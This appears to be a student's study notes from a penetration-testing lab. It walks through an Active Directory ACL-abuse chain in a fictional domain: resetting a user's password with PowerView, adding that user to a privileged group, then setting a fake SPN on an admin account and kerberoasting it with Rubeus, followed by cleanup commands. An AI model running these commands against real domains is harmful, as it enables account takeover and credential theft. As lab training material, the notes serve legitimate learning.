---
description: From previous Section, we will continue to do attack
---

# ACL Abuse Tactics

<figure><img src="../../.gitbook/assets/ertytr.png" alt=""><figcaption></figcaption></figure>

* First we will use user `wley` to change password of `damundsen`
* then using `damundsen` we will use `Generic Write` right to add user we control to `Help Desk Level 1` group
* User of `Help Desk Level 1` group is member of `Info Tech` group and member of `Info Tech` group have generic all right over user `adunn`
* Thus we will take control of user `Adunn`

we are currently logged in as user `htb-student` and have credential of `wley` , so we are authenticating as user `wley` by

* `PS C:\\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` → creating $secpassword variable which stores passoword of wley
* `PS C:\\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)` → creating $cred variable which stores PSCredential object which contains securely stored user credentials. Because later -Credential parameter expects a PSCredential object not a plain text string.
* `PS C:\\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` → creating variable to store password for damundsen user

import powerview and then

* `PS C:\\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` → changing password of user damundsen
* `PS C:\\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $damundsenPassword)` → creating PSCredential object which contains creds of user damundsen

Before adding user damundsen to `Help Desk Level 1` Group, lets confirm our user is not a member of the target group

* `PS C:\\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`

Now lets add to `Help Desk Level 1` group

* `PS C:\\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
* `PS C:\\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName` → confirming damundsen was added to the group

If for some reason we donot have permission to interrupt the admin account `adunn`

we can create a fake SPN, then kerberoast to obtain TGS ticket and hopefully crack the hash offline .

* `PS C:\\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` → creating a fake SPN
* `PS C:\\htb> .\\Rubeus.exe kerberoast /user:adunn /nowrap`

Kerberoasting with Rubeus

| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`                | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host.                         |
| --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |
| `ConvertFrom-SddlString`                                                                                  | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host.                              |
